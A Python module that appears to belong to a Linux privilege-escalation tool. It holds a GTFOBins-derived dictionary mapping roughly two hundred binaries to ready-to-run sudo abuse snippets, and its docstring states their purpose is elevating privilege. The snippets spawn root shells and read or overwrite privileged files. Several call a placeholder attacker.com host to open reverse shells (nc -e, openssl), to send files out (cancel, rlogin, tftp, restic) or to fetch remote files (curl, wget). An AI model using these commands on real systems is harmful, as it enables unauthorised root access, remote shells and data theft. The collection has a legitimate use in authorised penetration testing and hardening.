#!/usr/bin/env python
# -*- coding: utf-8 -*-


class GTFOBins:
    """
    Binaries that allow to execute commands from it.
    If run with higher privilege (suid / cron / ...) could be used to elevate our privilege
    http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html
    https://chryzsh.gitbooks.io/pentestbook/privilege_escalation_-_linux.html#abusing-sudo-rights
    http://touhidshaikh.com/blog/?p=790
    """

    def __init__(self):
        """
        List taken from GTFOBins:
        https://gtfobins.github.io/#
        """

        self.binaries = {
          "apt": "sudo apt-get changelog apt\n!/bin/sh\n\n----TF=$(mktemp)\necho 'Dpkg::Pre-Invoke {\"/bin/sh;false\"}' > $TF\nsudo apt install -c $TF sl\n\n----sudo apt update -o APT::Update::Pre-Invoke::=/bin/sh\n----", 
          "apt-get": "sudo apt-get changelog apt\n!/bin/sh\n\n----TF=$(mktemp)\necho 'Dpkg::Pre-Invoke {\"/bin/sh;false\"}' > $TF\nsudo apt-get install -c $TF sl\n\n----sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh\n----", 
          "ar": "OUTFILE=$(mktemp -u)\nLFILE=file_to_read\nsudo ar r \"$OUTFILE\" \"$LFILE\"\ncat \"$OUTFILE\"\n\n", 
          "aria2c": "COMMAND='id'\nTF=$(mktemp)\necho \"$COMMAND\" > $TF\nchmod +x $TF\nsudo aria2c --on-download-error=$TF http://x\n\n", 
          "arp": "LFILE=file_to_read\nsudo arp -v -f \"$LFILE\"\n\n", 
          "ash": "sudo ash\n", 
          "at": "echo \"/bin/sh <$(tty) >$(tty) 2>$(tty)\" | sudo at now; tail -f /dev/null\n\n", 
          "atobm": "LFILE=file_to_read\nsudo atobm $LFILE 2>&1 | awk -F \"'\" '{printf \"%s\", $2}'\n\n", 
          "awk": "sudo awk 'BEGIN {system(\"/bin/sh\")}'\n", 
          "base32": "LFILE=file_to_read\nsudo base32 \"$LFILE\" | base32 --decode\n\n", 
          "base64": "LFILE=file_to_read\nsudo base64 \"$LFILE\" | base64 --decode\n\n", 
          "basenc": "LFILE=file_to_read\nsudo basenc --base64 $LFILE | basenc -d --base64\n\n", 
          "bash": "sudo bash\n", 
          "bpftrace": "sudo bpftrace -e 'BEGIN {system(\"/bin/sh\");exit()}'\n----TF=$(mktemp)\necho 'BEGIN {system(\"/bin/sh\");exit()}' >$TF\nsudo bpftrace $TF\n\n----sudo bpftrace -c /bin/sh -e 'END {exit()}'\n----", 
          "bridge": "LFILE=file_to_read\nsudo bridge -b \"$LFILE\"\n\n", 
          "bundler": "sudo bundler help\n!/bin/sh\n\n", 
          "busctl": "sudo busctl --show-machine\n!/bin/sh\n\n", 
          "busybox": "sudo busybox sh\n", 
          "byebug": "TF=$(mktemp)\necho 'system(\"/bin/sh\")' > $TF\nsudo byebug $TF\ncontinue\n\n", 
          "cancel": "RHOST=attacker.com\nRPORT=12345\nLFILE=file_to_send\ncancel -u \"$(cat $LFILE)\" -h $RHOST:$RPORT\n\n", 
          "capsh": "sudo capsh --\n", 
          "cat": "LFILE=file_to_read\nsudo cat \"$LFILE\"\n\n", 
          "check_by_ssh": "sudo check_by_ssh -o \"ProxyCommand /bin/sh -i <$(tty) |& tee $(tty)\" -H localhost -C xx\n", 
          "check_cups": "LFILE=file_to_read\nsudo check_cups --extra-opts=@$LFILE\n\n", 
          "check_log": "LFILE=file_to_write\nINPUT=input_file\nsudo check_log -F $INPUT -O $LFILE\n\n", 
          "check_memory": "LFILE=file_to_read\nsudo check_memory --extra-opts=@$LFILE\n\n", 
          "check_raid": "LFILE=file_to_read\nsudo check_raid --extra-opts=@$LFILE\n\n", 
          "check_ssl_cert": "COMMAND=id\nOUTPUT=output_file\nTF=$(mktemp)\necho \"$COMMAND | tee $OUTPUT\" > $TF\nchmod +x $TF\numask 022\ncheck_ssl_cert --curl-bin $TF -H example.net\ncat $OUTPUT\n\n", 
          "check_statusfile": "LFILE=file_to_read\nsudo check_statusfile $LFILE\n\n", 
          "chmod": "LFILE=file_to_change\nsudo chmod 6777 $LFILE\n\n", 
          "chown": "LFILE=file_to_change\nsudo chown $(id -un):$(id -gn) $LFILE\n\n", 
          "chroot": "sudo chroot /\n\n", 
          "cobc": "TF=$(mktemp -d)\necho 'CALL \"SYSTEM\" USING \"/bin/sh\".' > $TF/x\nsudo cobc -xFj --frelax-syntax-checks $TF/x\n\n", 
          "column": "LFILE=file_to_read\nsudo column $LFILE\n\n", 
          "comm": "LFILE=file_to_read\nsudo comm $LFILE /dev/null 2>/dev/null\n\n", 
          "composer": "TF=$(mktemp -d)\necho '{\"scripts\":{\"x\":\"/bin/sh -i 0<&3 1>&3 2>&3\"}}' >$TF/composer.json\nsudo composer --working-dir=$TF run-script x\n\n", 
          "cowsay": "TF=$(mktemp)\necho 'exec \"/bin/sh\";' >$TF\nsudo cowsay -f $TF x\n\n", 
          "cowthink": "TF=$(mktemp)\necho 'exec \"/bin/sh\";' >$TF\nsudo cowthink -f $TF x\n\n", 
          "cp": "LFILE=file_to_write\necho \"DATA\" | sudo cp /dev/stdin \"$LFILE\"\n\n----LFILE=file_to_write\nTF=$(mktemp)\necho \"DATA\" > $TF\nsudo cp $TF $LFILE\n\n----", 
          "cpan": "sudo cpan\n! exec '/bin/bash'\n\n", 
          "cpio": "echo '/bin/sh </dev/tty >/dev/tty' >localhost\nsudo cpio -o --rsh-command /bin/sh -F localhost:\n\n----LFILE=file_to_read\nTF=$(mktemp -d)\necho \"$LFILE\" | sudo cpio -R $UID -dp $TF\ncat \"$TF/$LFILE\"\n\n----LFILE=file_to_write\nLDIR=where_to_write\necho DATA >$LFILE\necho $LFILE | sudo cpio -R 0:0 -p $LDIR\n\n----", 
          "cpulimit": "sudo cpulimit -l 100 -f /bin/sh\n", 
          "crash": "sudo crash -h\n!sh\n\n", 
          "crontab": "sudo crontab -e\n", 
          "csh": "sudo csh\n", 
          "csplit": "LFILE=file_to_read\ncsplit $LFILE 1\ncat xx01\n\n", 
          "csvtool": "sudo csvtool call '/bin/sh;false' /etc/passwd\n", 
          "cupsfilter": "LFILE=file_to_read\nsudo cupsfilter -i application/octet-stream -m application/octet-stream $LFILE\n\n", 
          "curl": "URL=http://attacker.com/file_to_get\nLFILE=file_to_save\nsudo curl $URL -o $LFILE\n\n", 
          "cut": "LFILE=file_to_read\nsudo cut -d \"\" -f1 \"$LFILE\"\n\n", 
          "dash": "sudo dash\n", 
          "date": "LFILE=file_to_read\nsudo date -f $LFILE\n\n", 
          "dd": "LFILE=file_to_write\necho \"data\" | sudo dd of=$LFILE\n\n", 
          "dialog": "LFILE=file_to_read\nsudo dialog --textbox \"$LFILE\" 0 0\n\n", 
          "diff": "LFILE=file_to_read\nsudo diff --line-format=%L /dev/null $LFILE\n\n", 
          "dig": "LFILE=file_to_read\nsudo dig -f $LFILE\n\n", 
          "dmesg": "sudo dmesg -H\n!/bin/sh\n\n", 
          "dmsetup": "sudo dmsetup create base <<EOF\n0 3534848 linear /dev/loop0 94208\nEOF\nsudo dmsetup ls --exec '/bin/sh -s'\n\n", 
          "dnf": "sudo dnf install -y x-1.0-1.noarch.rpm\n\n", 
          "docker": "sudo docker run -v /:/mnt --rm -it alpine chroot /mnt sh\n", 
          "dpkg": "sudo dpkg -l\n!/bin/sh\n\n----sudo dpkg -i x_1.0_all.deb\n----", 
          "easy_install": "TF=$(mktemp -d)\necho \"import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')\" > $TF/setup.py\nsudo easy_install $TF\n\n", 
          "eb": "sudo eb logs\n!/bin/sh\n\n", 
          "ed": "sudo ed\n!/bin/sh\n\n", 
          "emacs": "sudo emacs -Q -nw --eval '(term \"/bin/sh\")'\n", 
          "env": "sudo env /bin/sh\n", 
          "eqn": "LFILE=file_to_read\nsudo eqn \"$LFILE\"\n\n", 
          "ex": "sudo ex\n!/bin/sh\n\n", 
          "exiftool": "LFILE=file_to_write\nINPUT=input_file\nsudo exiftool -filename=$LFILE $INPUT\n\n", 
          "expand": "LFILE=file_to_read\nsudo expand \"$LFILE\"\n\n", 
          "expect": "sudo expect -c 'spawn /bin/sh;interact'\n", 
          "facter": "TF=$(mktemp -d)\necho 'exec(\"/bin/sh\")' > $TF/x.rb\nsudo FACTERLIB=$TF facter\n\n", 
          "file": "LFILE=file_to_read\nsudo file -f $LFILE\n\n", 
          "find": "sudo find . -exec /bin/sh \\; -quit\n", 
          "finger": "RHOST=attacker.com\nLFILE=file_to_save\nfinger x@$RHOST | base64 -d > \"$LFILE\"\n\n", 
          "flock": "sudo flock -u / /bin/sh\n", 
          "fmt": "LFILE=file_to_read\nsudo fmt -999 \"$LFILE\"\n\n", 
          "fold": "LFILE=file_to_read\nsudo fold -w99999999 \"$LFILE\"\n\n", 
          "ftp": "sudo ftp\n!/bin/sh\n\n", 
          "gawk": "sudo gawk 'BEGIN {system(\"/bin/sh\")}'\n", 
          "gcc": "sudo gcc -wrapper /bin/sh,-s .\n", 
          "gdb": "sudo gdb -nx -ex '!sh' -ex quit\n", 
          "gem": "sudo gem open -e \"/bin/sh -c /bin/sh\" rdoc\n", 
          "genisoimage": "LFILE=file_to_read\nsudo genisoimage -q -o - \"$LFILE\"\n\n", 
          "ghc": "sudo ghc -e 'System.Process.callCommand \"/bin/sh\"'\n", 
          "ghci": "sudo ghci\nSystem.Process.callCommand \"/bin/sh\"\n\n", 
          "gimp": "sudo gimp -idf --batch-interpreter=python-fu-eval -b 'import os; os.system(\"sh\")'\n", 
          "git": "sudo PAGER='sh -c \"exec sh 0<&1\"' git -p help\n----sudo git -p help config\n!/bin/sh\n\n----sudo git branch --help config\n!/bin/sh\n\n----TF=$(mktemp -d)\ngit init \"$TF\"\necho 'exec /bin/sh 0<&2 1>&2' >\"$TF/.git/hooks/pre-commit.sample\"\nmv \"$TF/.git/hooks/pre-commit.sample\" \"$TF/.git/hooks/pre-commit\"\nsudo git -C \"$TF\" commit --allow-empty -m x\n\n----TF=$(mktemp -d)\nln -s /bin/sh \"$TF/git-x\"\nsudo git \"--exec-path=$TF\" x\n\n----", 
          "grep": "LFILE=file_to_read\nsudo grep '' $LFILE\n\n", 
          "gtester": "TF=$(mktemp)\necho '#!/bin/sh' > $TF\necho 'exec /bin/sh 0<&1' >> $TF\nchmod +x $TF\nsudo gtester -q $TF\n\n", 
          "gzip": "LFILE=file_to_read\nsudo gzip -f $LFILE -t\n\n", 
          "hd": "LFILE=file_to_read\nsudo hd \"$LFILE\"\n\n", 
          "head": "LFILE=file_to_read\nsudo head -c1G \"$LFILE\"\n\n", 
          "hexdump": "LFILE=file_to_read\nsudo hexdump -C \"$LFILE\"\n\n", 
          "highlight": "LFILE=file_to_read\nsudo highlight --no-doc --failsafe \"$LFILE\"\n\n", 
          "hping3": "sudo hping3\n/bin/sh\n\n", 
          "iconv": "LFILE=file_to_read\n./iconv -f 8859_1 -t 8859_1 \"$LFILE\"\n\n", 
          "iftop": "sudo iftop\n!/bin/sh\n\n", 
          "install": "LFILE=file_to_change\nTF=$(mktemp)\nsudo install -m 6777 $LFILE $TF\n\n", 
          "ionice": "sudo ionice /bin/sh\n", 
          "ip": "LFILE=file_to_read\nsudo ip -force -batch \"$LFILE\"\n\n----sudo ip netns add foo\nsudo ip netns exec foo /bin/sh\nsudo ip netns delete foo\n\n----", 
          "irb": "sudo irb\nexec '/bin/bash'\n\n", 
          "jjs": "echo \"Java.type('java.lang.Runtime').getRuntime().exec('/bin/sh -c \\$@|sh _ echo sh <$(tty) >$(tty) 2>$(tty)').waitFor()\" | sudo jjs\n", 
          "join": "LFILE=file_to_read\nsudo join -a 2 /dev/null $LFILE\n\n", 
          "journalctl": "sudo journalctl\n!/bin/sh\n\n", 
          "jq": "LFILE=file_to_read\nsudo jq -Rr . \"$LFILE\"\n\n", 
          "jrunscript": "sudo jrunscript -e \"exec('/bin/sh -c \\$@|sh _ echo sh <$(tty) >$(tty) 2>$(tty)')\"\n", 
          "ksh": "sudo ksh\n", 
          "ksshell": "LFILE=file_to_read\nsudo ksshell -i $LFILE\n\n", 
          "ld.so": "sudo /lib/ld.so /bin/sh\n", 
          "ldconfig": "TF=$(mktemp -d)\necho \"$TF\" > \"$TF/conf\"\n# move malicious libraries in $TF\nsudo ldconfig -f \"$TF/conf\"\n\n", 
          "less": "sudo less /etc/profile\n!/bin/sh\n\n", 
          "logsave": "sudo logsave /dev/null /bin/sh -i\n", 
          "look": "LFILE=file_to_read\nsudo look '' \"$LFILE\"\n\n", 
          "ltrace": "sudo ltrace -b -L /bin/sh\n", 
          "lua": "sudo lua -e 'os.execute(\"/bin/sh\")'\n", 
          "lwp-download": "URL=http://attacker.com/file_to_get\nLFILE=file_to_save\nsudo lwp-download $URL $LFILE\n\n", 
          "lwp-request": "LFILE=file_to_read\nsudo lwp-request \"file://$LFILE\"\n\n", 
          "mail": "sudo mail --exec='!/bin/sh'\n", 
          "make": "COMMAND='/bin/sh'\nsudo make -s --eval=$'x:\\n\\t-'\"$COMMAND\"\n\n", 
          "man": "sudo man man\n!/bin/sh\n\n", 
          "mawk": "sudo mawk 'BEGIN {system(\"/bin/sh\")}'\n", 
          "more": "TERM= sudo more /etc/profile\n!/bin/sh\n\n", 
          "mount": "sudo mount -o bind /bin/sh /bin/mount\nsudo mount\n\n", 
          "mtr": "LFILE=file_to_read\nsudo mtr --raw -F \"$LFILE\"\n\n", 
          "mv": "LFILE=file_to_write\nTF=$(mktemp)\necho \"DATA\" > $TF\nsudo mv $TF $LFILE\n\n", 
          "mysql": "sudo mysql -e '\\! /bin/sh'\n", 
          "nano": "sudo nano\n^R^X\nreset; sh 1>&0 2>&0\n\n", 
          "nawk": "sudo nawk 'BEGIN {system(\"/bin/sh\")}'\n", 
          "nc": "RHOST=attacker.com\nRPORT=12345\nsudo nc -e /bin/sh $RHOST $RPORT\n\n", 
          "nice": "sudo nice /bin/sh\n", 
          "nl": "LFILE=file_to_read\nsudo nl -bn -w1 -s '' $LFILE\n\n", 
          "nmap": "TF=$(mktemp)\necho 'os.execute(\"/bin/sh\")' > $TF\nsudo nmap --script=$TF\n\n----sudo nmap --interactive\nnmap> !sh\n\n----", 
          "node": "sudo node -e 'child_process.spawn(\"/bin/sh\", {stdio: [0, 1, 2]})'\n\n", 
          "nohup": "sudo nohup /bin/sh -c \"sh <$(tty) >$(tty) 2>$(tty)\"\n", 
          "npm": "TF=$(mktemp -d)\necho '{\"scripts\": {\"preinstall\": \"/bin/sh\"}}' > $TF/package.json\nsudo npm -C $TF --unsafe-perm i\n\n", 
          "nroff": "TF=$(mktemp -d)\necho '#!/bin/sh' > $TF/groff\necho '/bin/sh' >> $TF/groff\nchmod +x $TF/groff\nsudo GROFF_BIN_PATH=$TF nroff\n\n", 
          "nsenter": "sudo nsenter /bin/sh\n", 
          "od": "LFILE=file_to_read\nsudo od -An -c -w9999 \"$LFILE\"\n\n", 
          "openssl": "RHOST=attacker.com\nRPORT=12345\nmkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | sudo openssl s_client -quiet -connect $RHOST:$RPORT > /tmp/s; rm /tmp/s\n\n", 
          "openvpn": "sudo openvpn --dev null --script-security 2 --up '/bin/sh -c sh'\n\n----LFILE=file_to_read\nsudo openvpn --config \"$LFILE\"\n\n----", 
          "openvt": "COMMAND=id\nTF=$(mktemp -u)\nsudo openvt -- sh -c \"$COMMAND >$TF 2>&1\"\ncat $TF\n\n", 
          "paste": "LFILE=file_to_read\nsudo paste $LFILE\n\n", 
          "pdb": "TF=$(mktemp)\necho 'import os; os.system(\"/bin/sh\")' > $TF\nsudo pdb $TF\ncont\n\n", 
          "perl": "sudo perl -e 'exec \"/bin/sh\";'\n", 
          "pg": "sudo pg /etc/profile\n!/bin/sh\n\n", 
          "php": "CMD=\"/bin/sh\"\nsudo php -r \"system('$CMD');\"\n\n", 
          "pic": "sudo pic -U\n.PS\nsh X sh X\n\n", 
          "pico": "sudo pico\n^R^X\nreset; sh 1>&0 2>&0\n\n", 
          "pip": "TF=$(mktemp -d)\necho \"import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')\" > $TF/setup.py\nsudo pip install $TF\n\n", 
          "pkexec": "sudo pkexec /bin/sh\n", 
          "pr": "LFILE=file_to_read\npr -T $LFILE\n\n", 
          "pry": "sudo pry\nsystem(\"/bin/sh\")\n\n", 
          "psql": "psql\n\\?\n!/bin/sh\n\n", 
          "puppet": "sudo puppet apply -e \"exec { '/bin/sh -c \\\"exec sh -i <$(tty) >$(tty) 2>$(tty)\\\"': }\"\n\n", 
          "python": "sudo python -c 'import os; os.system(\"/bin/sh\")'\n", 
          "rake": "sudo rake -p '`/bin/sh 1>&0`'\n", 
          "readelf": "LFILE=file_to_read\nsudo readelf -a @$LFILE\n\n", 
          "red": "sudo red file_to_write\na\nDATA\n.\nw\nq\n\n", 
          "redcarpet": "LFILE=file_to_read\nsudo redcarpet \"$LFILE\"\n\n", 
          "restic": "RHOST=attacker.com\nRPORT=12345\nLFILE=file_or_dir_to_get\nNAME=backup_name\nsudo restic backup -r \"rest:http://$RHOST:$RPORT/$NAME\" \"$LFILE\"\n\n", 
          "rev": "LFILE=file_to_read\nsudo rev $LFILE | rev\n\n", 
          "rlogin": "RHOST=attacker.com\nRPORT=12345\nLFILE=file_to_send\nrlogin -l \"$(cat $LFILE)\" -p $RPORT $RHOST\n\n", 
          "rlwrap": "sudo rlwrap /bin/sh\n", 
          "rpm": "sudo rpm --eval '%{lua:os.execute(\"/bin/sh\")}'\n----sudo rpm -ivh x-1.0-1.noarch.rpm\n\n----", 
          "rpmquery": "sudo rpmquery --eval '%{lua:posix.exec(\"/bin/sh\")}'\n", 
          "rsync": "sudo rsync -e 'sh -c \"sh 0<&2 1>&2\"' 127.0.0.1:/dev/null\n", 
          "ruby": "sudo ruby -e 'exec \"/bin/sh\"'\n", 
          "run-mailcap": "sudo run-mailcap --action=view /etc/hosts\n!/bin/sh\n\n", 
          "run-parts": "sudo run-parts --new-session --regex '^sh$' /bin\n", 
          "rview": "sudo rview -c ':py import os; os.execl(\"/bin/sh\", \"sh\", \"-c\", \"reset; exec sh\")'\n----sudo rview -c ':lua os.execute(\"reset; exec sh\")'\n----", 
          "rvim": "sudo rvim -c ':py import os; os.execl(\"/bin/sh\", \"sh\", \"-c\", \"reset; exec sh\")'\n----sudo rvim -c ':lua os.execute(\"reset; exec sh\")'\n----", 
          "scp": "TF=$(mktemp)\necho 'sh 0<&2 1>&2' > $TF\nchmod +x \"$TF\"\nsudo scp -S $TF x y:\n\n", 
          "screen": "sudo screen\n", 
          "script": "sudo script -q /dev/null\n", 
          "sed": "sudo sed -n '1e exec sh 1>&0' /etc/hosts\n", 
          "service": "sudo service ../../bin/sh\n", 
          "setarch": "sudo setarch $(arch) /bin/sh\n", 
          "sftp": "HOST=user@attacker.com\nsudo sftp $HOST\n!/bin/sh\n\n", 
          "sg": "sudo sg root\n\n", 
          "shuf": "LFILE=file_to_write\nsudo shuf -e DATA -o \"$LFILE\"\n\n", 
          "slsh": "sudo slsh -e 'system(\"/bin/sh\")'\n", 
          "smbclient": "sudo smbclient '\\\\attacker\\share'\n!/bin/sh\n\n", 
          "socat": "sudo socat stdin exec:/bin/sh\n\n", 
          "soelim": "LFILE=file_to_read\nsudo soelim \"$LFILE\"\n\n", 
          "sort": "LFILE=file_to_read\nsudo sort -m \"$LFILE\"\n\n", 
          "split": "split --filter=/bin/sh /dev/stdin\n\n", 
          "sqlite3": "sudo sqlite3 /dev/null '.shell /bin/sh'\n", 
          "ss": "LFILE=file_to_read\nsudo ss -a -F $LFILE\n\n", 
          "ssh": "sudo ssh -o ProxyCommand=';sh 0<&2 1>&2' x\n", 
          "ssh-keygen": "sudo ssh-keygen -D ./lib.so\n", 
          "ssh-keyscan": "LFILE=file_to_read\nsudo ssh-keyscan -f $LFILE\n\n", 
          "start-stop-daemon": "sudo start-stop-daemon -n $RANDOM -S -x /bin/sh\n", 
          "stdbuf": "sudo stdbuf -i0 /bin/sh\n", 
          "strace": "sudo strace -o /dev/null /bin/sh\n", 
          "strings": "LFILE=file_to_read\nsudo strings \"$LFILE\"\n\n", 
          "su": "sudo su\n", 
          "sysctl": "LFILE=file_to_read\nsudo sysctl -n \"/../../$LFILE\"\n\n", 
          "systemctl": "TF=$(mktemp)\necho /bin/sh >$TF\nchmod +x $TF\nsudo SYSTEMD_EDITOR=$TF systemctl edit system.slice\n\n----TF=$(mktemp).service\necho '[Service]\nType=oneshot\nExecStart=/bin/sh -c \"id > /tmp/output\"\n[Install]\nWantedBy=multi-user.target' > $TF\nsudo systemctl link $TF\nsudo systemctl enable --now $TF\n\n----sudo systemctl\n!sh\n\n----", 
          "tac": "LFILE=file_to_read\nsudo tac -s 'RANDOM' \"$LFILE\"\n\n", 
          "tail": "LFILE=file_to_read\nsudo tail -c1G \"$LFILE\"\n\n", 
          "tar": "sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh\n", 
          "taskset": "sudo taskset 1 /bin/sh\n", 
          "tbl": "LFILE=file_to_read\nsudo tbl $LFILE\n\n", 
          "tclsh": "sudo tclsh\nexec /bin/sh <@stdin >@stdout 2>@stderr\n\n", 
          "tcpdump": "COMMAND='id'\nTF=$(mktemp)\necho \"$COMMAND\" > $TF\nchmod +x $TF\nsudo tcpdump -ln -i lo -w /dev/null -W 1 -G 1 -z $TF -Z root\n\n", 
          "tee": "LFILE=file_to_write\necho DATA | sudo tee -a \"$LFILE\"\n\n", 
          "telnet": "RHOST=attacker.com\nRPORT=12345\nsudo telnet $RHOST $RPORT\n^]\n!/bin/sh\n\n", 
          "tftp": "RHOST=attacker.com\nsudo tftp $RHOST\nput file_to_send\n\n", 
          "time": "sudo /usr/bin/time /bin/sh\n", 
          "timeout": "sudo timeout --foreground 7d /bin/sh\n", 
          "tmux": "sudo tmux\n", 
          "top": "echo -e 'pipe\\tx\\texec /bin/sh 1>&0 2>&0' >>/root/.config/procps/toprc\nsudo top\n# press return twice\nreset\n\n", 
          "troff": "LFILE=file_to_read\nsudo troff $LFILE\n\n", 
          "ul": "LFILE=file_to_read\nsudo ul \"$LFILE\"\n\n", 
          "unexpand": "LFILE=file_to_read\nsudo unexpand -t99999999 \"$LFILE\"\n\n", 
          "uniq": "LFILE=file_to_read\nsudo uniq \"$LFILE\"\n\n", 
          "unshare": "sudo unshare /bin/sh\n", 
          "update-alternatives": "LFILE=/path/to/file_to_write\nTF=$(mktemp)\necho DATA >$TF\nsudo update-alternatives --force --install \"$LFILE\" x \"$TF\" 0\n\n", 
          "uudecode": "LFILE=file_to_read\nsudo uuencode \"$LFILE\" /dev/stdout | uudecode\n\n", 
          "uuencode": "LFILE=file_to_read\nsudo uuencode \"$LFILE\" /dev/stdout | uudecode\n\n", 
          "valgrind": "sudo valgrind /bin/sh\n", 
          "vi": "sudo vi -c ':!/bin/sh' /dev/null\n", 
          "view": "sudo view -c ':!/bin/sh'\n----sudo view -c ':py import os; os.execl(\"/bin/sh\", \"sh\", \"-c\", \"reset; exec sh\")'\n----sudo view -c ':lua os.execute(\"reset; exec sh\")'\n----", 
          "vigr": "sudo vigr\n", 
          "vim": "sudo vim -c ':!/bin/sh'\n----sudo vim -c ':py import os; os.execl(\"/bin/sh\", \"sh\", \"-c\", \"reset; exec sh\")'\n----sudo vim -c ':lua os.execute(\"reset; exec sh\")'\n----", 
          "vimdiff": "sudo vimdiff -c ':!/bin/sh'\n----sudo vimdiff -c ':py import os; os.execl(\"/bin/sh\", \"sh\", \"-c\", \"reset; exec sh\")'\n----sudo vimdiff -c ':lua os.execute(\"reset; exec sh\")'\n----", 
          "vipw": "sudo vipw\n", 
          "virsh": "SCRIPT=script_to_run\nTF=$(mktemp)\ncat > $TF << EOF\n<domain type='kvm'>\n  <name>x</name>\n  <os>\n    <type arch='x86_64'>hvm</type>\n  </os>\n  <memory unit='KiB'>1</memory>\n  <devices>\n    <interface type='ethernet'>\n      <script path='$SCRIPT'/>\n    </interface>\n  </devices>\n</domain>\nEOF\nsudo virsh -c qemu:///system create $TF\nvirsh -c qemu:///system destroy x\n\n", 
          "watch": "sudo watch -x sh -c 'reset; exec sh 1>&0 2>&0'\n", 
          "wget": "URL=http://attacker.com/file_to_get\nLFILE=file_to_save\nsudo wget $URL -O $LFILE\n\n", 
          "whois": "RHOST=attacker.com\nRPORT=12345\nLFILE=file_to_save\nwhois -h $RHOST -p $RPORT > \"$LFILE\"\n\n----RHOST=attacker.com\nRPORT=12345\nLFILE=file_to_save\nwhois -h $RHOST -p $RPORT | base64 -d > \"$LFILE\"\n\n----", 
          "wish": "sudo wish\nexec /bin/sh <@stdin >@stdout 2>@stderr\n\n", 
          "xargs": "sudo xargs -a /dev/null sh\n", 
          "xmodmap": "LFILE=file_to_read\nsudo xmodmap -v $LFILE\n\n", 
          "xxd": "LFILE=file_to_read\nsudo xxd \"$LFILE\" | xxd -r\n\n", 
          "xz": "LFILE=file_to_read\nsudo xz -c \"$LFILE\" | xz -d\n\n", 
          "yelp": "LFILE=file_to_read\nyelp \"man:$LFILE\"\n\n", 
          "yum": "sudo yum localinstall -y x-1.0-1.noarch.rpm\n\n----TF=$(mktemp -d)\ncat >$TF/x<<EOF\n[main]\nplugins=1\npluginpath=$TF\npluginconfpath=$TF\nEOF\n\ncat >$TF/y.conf<<EOF\n[main]\nenabled=1\nEOF\n\ncat >$TF/y.py<<EOF\nimport os\nimport yum\nfrom yum.plugins import PluginYumExit, TYPE_CORE, TYPE_INTERACTIVE\nrequires_api_version='2.1'\ndef init_hook(conduit):\n  os.execl('/bin/sh','/bin/sh')\nEOF\n\nsudo yum -c $TF/x --enableplugin=y\n\n----", 
          "zip": "TF=$(mktemp -u)\nsudo zip $TF /etc/hosts -T -TT 'sh #'\nsudo rm $TF\n\n", 
          "zsh": "sudo zsh\n", 
          "zsoelim": "LFILE=file_to_read\nsudo zsoelim \"$LFILE\"\n\n", 
          "zypper": "sudo zypper x\n\n----TF=$(mktemp -d)\ncp /bin/sh $TF/zypper-x\nsudo PATH=$TF:$PATH zypper x\n\n----"
      }


    def find_binary(self, binary):
        """
        Found the associated command line to execute system code using the binary
        """
        for b in self.binaries:
            if b == binary.lower():
                return self.binaries[b]
        return False
